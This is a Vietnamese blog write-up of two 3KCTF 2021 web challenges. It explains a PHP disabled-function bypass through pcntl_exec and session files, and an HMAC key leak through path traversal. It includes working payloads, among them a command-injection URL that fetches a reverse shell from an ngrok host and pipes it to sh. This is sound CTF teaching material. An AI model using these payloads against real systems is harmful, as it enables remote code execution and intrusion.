---
layout: post
title: "[WRITEUP 3KCTF 2021]: WEB"
categories: CTF
toc: true
---
Vì một số công việc cá nhân nên mình viết writeup sau ctf end khá lâu nên mình sẽ tự deploy một số challenge và một số mình chỉ phân tích code và chỉ ra cách exploit.

- Tất cả source của từng bài mình để ở đây nhé -> [src](https://github.com/DauHoangTai/CTF/tree/master/2021/3KCTF)
## Challenge Online_comliper
- Vì mình deploy lại ở local nên mình đi thẳng vào phân tích code của author cung cấp nhé

### Analysis Source
Chúng ta được cung cấp một source và code server được viết bằng python. Chú ý thì thấy có 2 enpoint
![image](https://user-images.githubusercontent.com/54855855/121495607-f5a6e400-ca03-11eb-85a1-16bc6c66d507.png)
Ở đoạn code này thì thấy có 2 hàm là `get_random_string` và `check_file`, 2 hàm này lần lượt có chức năng là tạo ra một chuỗi random và kiểm tra file đó có tồn tại hay không.
![image](https://user-images.githubusercontent.com/54855855/121495928-34d53500-ca04-11eb-9f83-ba1d545fb829.png)
Endpoint đầu tiền là `/save`. Đoạn code này chúng ta có 2 tham số để có thể nhập vào đo là `c_type` và `code`.
c_type nhận php hoặc python nhưng đoạn elif đã được comment lại vậy là chúng ta chỉ có thể nhập `php` vào. Sau đó khi chúng ta truyền tham số vào `code` thì sẽ được check len (phải < 100), tiếp tục filename được gán bằng chuỗi ramdom được tạo bằng hàm mình đã mô tả ở trên. Cuối cùng ghi nhưng gì mình truyền ở `code` vô file vừa được tạo.
![image](https://user-images.githubusercontent.com/54855855/121501634-9b108680-ca09-11eb-981d-a6a54f71bdf4.png)
Ở endpoint `compile` này thì có 2 tham số có thể control là `c_type` và `filename`. `c_type` chúng ta có thể nhập vào là php và py.
Nói chung ở đoạn code này là sẽ thực thi file mà mình đã tạo ở `/save`.
Điều lạ ở đây là lúc tạo file thì chỉ có tạo file php không có python nhưng lúc compile lại có.
Tiếp tục chú ý file php.ini thì hầu như các function có thể RCE đã bị disable.

### Solution
Ở trong php có 1 function là `get_defined_functions` để list ra các function. Sau khi mình list ra và filter các function đã bị disable thì thấy được có một số fucntion không được filter như: `pcntl_exec, session_id, session_start`. Ở đây mình sử dụng `pcntl_exec` để RCE

### Payload
`/save` -> `c_type=php&code=<?php+pcntl_exec('/bin/ls',['/']);?>`
`/compile` -> `c_type=php&filename=vmfxqs.php`
- Cũng có thể sử dụng `session_id,session_start` như sau:
`/save` -> `c_type=php&code=<?php+session_id('test');session_start();$_SESSION['import+os;os.system("ls+/")#']='s'?>`
khi tạo session thì thường là nó sẽ được lưu trong tmp với filename là sess_id
`/compile` -> `c_type=php&filename=/tmp/sess_test`

## Challenge Emoij
- Source mình đã ở trên nên ai muốn test thì chỉ cần download về, sau đó cd tới thư mục emoij và cuối cùng là gõ lệnh `php -S localhost:8080`.

### Analysis Source
![image](https://user-images.githubusercontent.com/54855855/122628659-8a36d380-d0e1-11eb-9dfc-24566cdf0227.png)
Đoạn code này thì chúng ta thấy được secret và flag đã được giấu đi (tất nhiên :v ). Ở hàm `fetch_and_parse` thì đọc content từ link github bằng hàm `file_get_contents` sau đó trả về mảng giá trị nằm trong "" của src.
![image](https://user-images.githubusercontent.com/54855855/122628670-a20e5780-d0e1-11eb-9e74-b539d9c72558.png)
Ở đây thì có 3 tham số nhận vào là `url, key, dir`. Nói chúng đoạn này sẽ gán giá trị trả về là 1 mảng cho biến emoijList. Còn nếu như không có dir thì sẽ kiểm trả `key` mình nhập vào có bằng với `hash_hmac('sha256', $url, $secret)` hay không.

### Solution
Điều chú ý ở đây ![image](https://user-images.githubusercontent.com/54855855/122628754-35478d00-d0e2-11eb-99b4-aa2e70696fa1.png)
là đoạn code này nó sẽ duyệt qua mảng đó mà in ra giá trị và key là `hash_hmac('sha256', $v, $secret)` => mình có thể control được cái $v và => sẽ tìm đc giá trị của hash_hmac với giá trị mình đã truyền vô. từ đó mình tìm có thể biết được cái key cần truyền vào là gì.
Step 1: tạo 1 repo github với nội dung như sau: mình đã tạo sẵn -> https://raw.githubusercontent.com/DauHoangTai/3kctf/main/index.html
Step 2: Mình sẽ path travel để server đọc content ở repo của mình. khi đó sẽ lấy được giá trị của hash_hmac => mình có key

### Payload
`?dir=../../../DauHoangTai/3kctf/main/index` => tìm được key của value này.
![image](https://user-images.githubusercontent.com/54855855/122646717-d66a2e00-d14a-11eb-9093-a7d28c83ad2f.png)
```
?url="%3bcurl+https%3a//reverse-shell.sh/0.tcp.ngrok.io%3a12756+|+sh%3b+%23&key=e5bd633a5ad60d3e0ad64b04fda2ba9236e8ad07a74386ab5fc91d6425e4a48f
```
Vậy đã là thành công.
![image](https://user-images.githubusercontent.com/54855855/122646886-b0915900-d14b-11eb-9910-24508569d68c.png)
